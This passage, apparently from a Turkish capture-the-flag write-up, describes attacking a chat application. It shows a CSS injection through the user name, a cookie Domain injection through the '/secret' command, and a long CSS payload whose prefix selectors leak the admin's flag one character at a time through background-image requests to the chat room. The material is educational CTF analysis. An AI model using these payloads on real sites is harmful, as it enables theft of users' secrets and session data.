Path=/&#x27;</span>;<br>        sse.close();<br>        display(<span class="hljs-string">`You have been banned and from now on won&#x27;t be able to receive and send messages.`</span>);<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        display(<span class="hljs-string">`<span class="hljs-subst">$&#123;esc(data.name)&#125;</span> was banned.&lt;style&gt;span[data-name^=<span class="hljs-subst">$&#123;esc(data.name)&#125;</span>] &#123; color: red; &#125;&lt;/style&gt;`</span>);<br>      &#125;<br>    &#125;,<br>  &#125;)[data.type](data);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>Bizi sadece <strong>/name</strong>, <strong>/report</strong> ve <strong>/ban</strong> ilgilendiriyor demiştik. </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-title">ban</span>(<span class="hljs-params">data</span>)</span> &#123;<br>  <span class="hljs-keyword">if</span> (data.name == <span class="hljs-built_in">localStorage</span>.name) &#123;<br><span class="hljs-built_in">document</span>.cookie = <span class="hljs-string">&#x27;banned=1; Path=/&#x27;</span>;<br>sse.close();<br>display(<span class="hljs-string">`You have been banned and from now on won&#x27;t be able to receive and send messages.`</span>);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>display(<span class="hljs-string">`<span class="hljs-subst">$&#123;esc(data.name)&#125;</span> was banned.&lt;style&gt;span[data-name^=<span class="hljs-subst">$&#123;esc(data.name)&#125;</span>] &#123; color: red; &#125;&lt;/style&gt;`</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p><strong>CSP</strong>‘yi hatırlayalım. <strong>style-src</strong>, <strong>unsafe-inline</strong> olarak ayarlanmış.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">display(<span class="hljs-string">`Successfully changed secret to &lt;span data-secret=&quot;<span class="hljs-subst">$&#123;esc(cookie(<span class="hljs-string">&#x27;flag&#x27;</span>))&#125;</span>&quot;&gt;*****&lt;/span&gt;`</span><br></code></pre></td></tr></table></figure>
<p><strong>/secret</strong> ile <strong>flag</strong>‘i değiştirdiğimiz zaman <strong>flag</strong> değeri <strong>data-secret</strong> attribute’una değişen hali yazılıyormuş.</p>
<p><img src="cat-chat3.png" alt="nou"></p>
<p>Bunuda köşeye yazalım</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">display(<span class="hljs-string">`<span class="hljs-subst">$&#123;esc(data.name)&#125;</span> was banned.&lt;style&gt;span[data-name^=<span class="hljs-subst">$&#123;esc(data.name)&#125;</span>] &#123; color: red; &#125;&lt;/style&gt;`</span>);<br></code></pre></td></tr></table></figure>
<p><strong>span[data-name^=${esc(data.name)}]</strong> temizinden bir <strong>CSS injection</strong></p>
<p>Deneme senaryosu</p>
<ul>
<li>kullanıcı ismini diye değiştirsin <strong>nendo ] {background:url(/room/fa5c99a4-1bde-4998-a289-a0f424ef2e0f/send?name=admin&amp;msg=zzzzz%20you%20xxxx);}</strong></li>
<li>diğer kullanıcı report etsin</li>
<li>kullanıcı <strong>dog</strong> yazsın</li>
</ul>
<p><img src="cat-chat4.png" alt="yrmm"></p>
<p>Denememiz başarı oldu</p>
<p>Flag değerini <strong>data-secret</strong> attribute’una değişen hali yazdığını hatırlayalım.</p>
<p><strong>flag</strong>‘i değiştirmeden <strong>data-secret</strong> değerine yazdırmamız gerekiyor. </p>
<p><strong>server.js</strong>‘e tekrar dönüp bakalım</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;/secret&#x27;</span>:<br><span class="hljs-keyword">if</span> (!(arg = msg.match(<span class="hljs-regexp">/\/secret (.+)/</span>))) <span class="hljs-keyword">break</span>;<br>res.setHeader(<span class="hljs-string">&#x27;Set-Cookie&#x27;</span>, <span class="hljs-string">&#x27;flag=&#x27;</span> + arg[<span class="hljs-number">1</span>] <span class="hljs-string">&#x27;; Path=/; Max-Age=31536000&#x27;</span>);<br>response = &#123;<span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;secret&#x27;</span>&#125;;<br></code></pre></td></tr></table></figure>

<p><strong>Header</strong> set ederken girdi kontrolü yapmıyor. Başka domaine cookie’yi set edebiliriz.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&#x2F;secret yeniSecret; Domain&#x3D;x<br></code></pre></td></tr></table></figure>
<p>Dediğimizi var sayarsak. olmayan bir domaine set edecek bundan dolayi cookie değişmeyecek.</p>
<p><img src="cat-chat5.png" alt="nou"></p>
<p>Şimdi sıra <strong>data-secret</strong> değerini okumakta. </p>
<p>bknz. <a target="_blank" rel="noopener" href="https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense"><strong>CSS</strong> ile veri çalmak</a></p>
<p>her karakteri backroud resmi seklinde mesaj yollamasını sağlayacağız. <a target="_blank" rel="noopener" href="https://www.w3schools.com/cssref/css_selectors.asp"><strong>CSS Selector</strong> </a> ile durmadan ilk karakteri kontrol etmemiz gerekiyor</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br></pre></td><td class="code"><pre><code class="hljs css">/<span class="hljs-selector-tag">name</span> 4<span class="hljs-selector-tag">d4</span>] &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=/secret dummy; Domain=d2gn834g5z45m9h14fkk5rbh);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=a]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=a);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=b]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=b);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=c]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=c);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=d]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=d);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=e]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=e);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=f]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=f);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=g]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=g);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=h]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=h);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=i]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=i);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=j]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=j);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=k]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=k);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=l]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=l);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=m]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=m);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=n]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=n);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=o]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=o);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=p]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=p);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=q]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=q);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=r]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=r);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=s]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=s);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=t]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=t);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=u]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=u);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=v]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=v);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=w]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=w);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=x]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=x);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=y]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=y);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=z]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=z);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=A]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=A);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=B]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=B);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=C]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=C);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=D]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=D);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=E]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=E);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=F]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=F);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=G]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=G);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=H]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=H);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=I]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=I);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=J]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=J);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=K]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=K);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=L]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=L);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=M]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=M);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=N]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=N);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=O]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=O);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=P]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=P);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=Q]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=Q);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=R]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=R);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=S]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=S);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=T]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=T);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=U]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=U);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=V]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=V);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=W]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=W);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=X]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=X);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=Y]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=Y);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=Z]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=Z);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=0]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=1]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=<span class="hljs-number">1</span>);<br>&#125;<br><br><span 